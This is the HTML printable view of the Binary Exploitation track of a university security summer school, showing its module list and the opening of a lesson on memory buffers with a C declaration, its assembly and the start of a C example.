<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.101.0"><link rel=canonical type=text/html href=/binary/><link rel=alternate type=application/rss+xml href=/binary/index.xml><meta name=robots content="noindex, nofollow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Security Summer School</title><meta name=description content="A free Security Summer School focused on security essentials, binary exploitation and web security."><meta property="og:title" content><meta property="og:description" content="A free Security Summer School focused on security essentials, binary exploitation and web security."><meta property="og:type" content="website"><meta property="og:url" content="/binary/"><meta property="og:site_name" content="Security Summer School"><meta itemprop=name content><meta itemprop=description content="A free Security Summer School focused on security essentials, binary exploitation and web security."><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="A free Security Summer School focused on security essentials, binary exploitation and web security."><link rel=preload href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css as=style><link href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-00000000-0","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-section><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class=font-weight-bold>Security Summer School</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/binary/><span class=active>Binary Exploitation</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/essentials/><span>Security Essentials</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/web/><span>Web Security</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/community/><span>Community</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/docs/><span>Documentation</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><div class=td-content><div class="pageinfo pageinfo-primary d-print-none"><p>This is the multi-page printable view of this section.
<a href=# onclick="return print(),!1">Click here to print</a>.</p><p><a href=/binary/>Return to the regular view of this page</a>.</p></div><h1 class=title></h1><ul><li>1: <a href=#pg-fa25b64ee8789022920e697d8d8bfe2b></a></li><li>2: <a href=#pg-eaa30ce9d3ce94ffdd9669127b5fb173></a></li><li>3: <a href=#pg-17f3b0fdd7357596062ac7d64ac677be></a></li><li>4: <a href=#pg-44302718167d06aedc351da9619553bc></a></li><li>5: <a href=#pg-bf017b945edf284f9f46e861e257741f></a></li><li>6: <a href=#pg-e4a16c284332bf58c61e4344e785b929></a></li><li>7: <a href=#pg-fb4dc1c874ad98c377903ad9a0a00dd7></a></li><li>8: <a href=#pg-847dcd12c4f5b8e13e79183e8e054749></a></li><li>9: <a href=#pg-1b36084800b7f3c799b8474a184cbf0c></a></li><li>10: <a href=#pg-a0bf900fea717e3b3dea6108bd6921e3></a></li><li>11: <a href=#pg-4819e36a57703dede7da6f4fb2a329e6></a></li><li>12: <a href=#pg-8f5c31e10ee88a0594545152800351dc></a></li><li>13: <a href=#pg-239075f45b393a08894ffc3bfdda8d8e></a></li><li>14: <a href=#pg-fcff5975079be7b17175350208fb9932></a></li><li>15: <a href=#pg-eb5b6809ffd9ca9d2e8bd64485ba35aa></a></li></ul><div class=content><h1 id=security-summer-school-exploit-track>Security Summer School: Exploit Track</h1><p>Welcome to the Binary Exploit Track of the Security Summer School at University POLITEHNICA of Bucharest (UPB).</p><p>The Table Of Contents is:</p><ol><li><a href=exploration-tools/>Exploration Tools</a></li><li><a href=executables-and-processes/>Executables And Processes</a></li><li><a href=static-analysis/>Static Analysis</a></li><li><a href=dynamic-analysis/>Dynamic Analysis</a></li><li><a href=buffer-exploitation/>Buffer Exploitation</a></li><li><a href=shellcodes/>Shellcodes</a></li><li><a href=shellcodes-advanced/>Shellcodes Advanced</a></li><li><a href=return-oriented-programming/>Return Oriented Programming</a></li><li><a href=defense-mechanisms/>Defense Mechanisms</a></li><li><a href=information-leaks/>Information Leaks</a></li><li><a href=return-oriented-programming-advanced/>Return Oriented Programming Advanced</a></li><li><a href=bypassing-mitigations/>Bypassing Mitigations</a></li></ol></div></div><div class=td-content style=page-break-before:always><h1 id=pg-fa25b64ee8789022920e697d8d8bfe2b>1 -</h1><h1 id=buffer-exploitation>Buffer Exploitation</h1><h1 id=table-of-contents>Table of Contents</h1><ul><li><a href=#overview>Overview</a><ul><li><a href=#pwntools>Pwntools</a></li><li><a href=#buffers>Buffers</a></li><li><a href=#stack-buffer-overflow>Stack buffer overflow</a><ul><li><a href=#buffer-size-and-offset-identification>Buffer size and offset identification</a><ul><li><a href=#static-analysis>Static Analysis</a></li><li><a href=#dynamic-analysis>Dynamic analysis</a></li></ul></li></ul></li><li><a href=#input-output-functions>Input-Output functions</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#01-challenge-parrot>01. Challenge: Parrot</a></li><li><a href=#02-challenge-indexing>02. Challenge: Indexing</a></li><li><a href=#03-challenge-smashthestack-level7>03. Challenge: Smashthestack Level7</a></li><li><a href=#04-challenge-neighbourly>04. Challenge: Neighbourly</a></li><li><a href=#05-challenge-input-functions>05. Challenge: Input Functions</a></li><li><a href=#06-challenge-bonus-birds>06. Challenge: Bonus: Birds</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul><h2 id=pwntools>Pwntools</h2><p>In this lab we will be using the <code>pwntools</code> python module to solve the tasks. Check outh the <a href=../../extra/pwntools-intro/README.md>Pwntools Tutorial section</a>.</p><h2 id=buffers>Buffers</h2><p>A buffer is an area of contiguous data in memory, determined by a starting address, contents and length. Understanding how buffers are used (or misused) is vital for both offensive and defensive purposes.
In C, we can declare a buffer of bytes as a char array, as follows:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>local_buffer</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>];</span>
</span></span></code></pre></div><p>Which results in the following assembly code:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#000>push</span>   <span style=color:#204a87>rbp</span>
</span></span><span style=display:flex><span><span style=color:#000>mov</span>    <span style=color:#204a87>rbp</span><span style=color:#000;font-weight:700>,</span><span style=color:#204a87>rsp</span>
</span></span><span style=display:flex><span><span style=color:#000>sub</span>    <span style=color:#204a87>rsp</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0x20</span>
</span></span><span style=display:flex><span><span style=color:#000>...</span>
</span></span><span style=display:flex><span><span style=color:#000>ret</span>
</span></span></code></pre></div><p>Notice that buffer allocation is done by simply subtracting its intended size from the current stack pointer (<code>sub rsp, 0x20</code>). This simply reserves space on the stack (remember that on x86 the stack grows “upwards”, from higher addresses to lower ones).</p><blockquote><p>A compiler may allocate more space on the stack than explicitly required due to alignment constraints or other hidden values. To exploit a program, the C source code may not be a good enough reference point for stack offsets. Only disassembling the executable will provide relevant information.</p></blockquote><p>Buffers can be also be stored in other places in memory, such as the heap, <code>.bss</code>, <code>.data</code> or <code>.rodata</code>.</p><p>Analyze and compile the following snippet (also present in the lab files, go to <code>00-tutorial</code> and run <code>make buffers</code>):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>g_buf_init_zero</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>{</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>};</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>/* g_buf_init_vals[5..31] will be 0 */</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>g_buf_init_vals</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>32</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000;font-weight:700>{</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>3</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>4</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>5</span><span style=color:#000;font-weight:700>};</span>
